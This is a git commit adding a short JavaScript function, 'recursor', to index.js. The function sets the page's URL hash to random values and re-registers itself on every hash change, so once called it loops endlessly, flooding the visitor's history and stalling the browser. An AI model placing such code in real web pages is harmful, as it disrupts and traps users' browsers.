b81a7d710b4ca043f2ee279a035fd5ff5fd82f90
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2018-06-13 11:30:03 -0400

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,9 @@
 
+function recursor() {
+  //Change hash of current URL
+  window.location.hash = Math.random() + "" + Math.random() + "" + Math.random();
+  //Recurse on hash changes
+  window.addEventListener('hashchange', function() {
+    recursor();
+  });
+}
